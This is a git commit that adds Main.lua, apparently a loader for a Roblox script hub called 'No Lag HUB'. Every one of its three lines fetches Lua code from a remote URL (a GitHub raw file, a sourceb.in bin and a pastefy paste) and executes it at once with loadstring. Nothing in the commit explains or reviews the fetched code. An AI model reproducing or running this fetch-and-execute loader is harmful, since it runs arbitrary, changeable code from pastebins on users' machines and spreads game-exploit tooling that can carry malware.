710ef3d8a072079ce6cf345cf9ac7f1cc6402636
NoLag-iid <147936257+NoLag-iid@users.noreply.github.com>
2025-07-18 06:00:10 +0800

    Create Main.lua

---
+++ Main.lua
@@ -0,0 +1,3 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/NoLag-id/No-Lag-HUB/refs/heads/main/Loader/Main.lua"))()
+loadstring(game:HttpGet("https://cdn.sourceb.in/bins/meKWZdllM2/0", true))()
+loadstring(game:HttpGet("https://pastefy.app/mGZB39lx/raw"))()
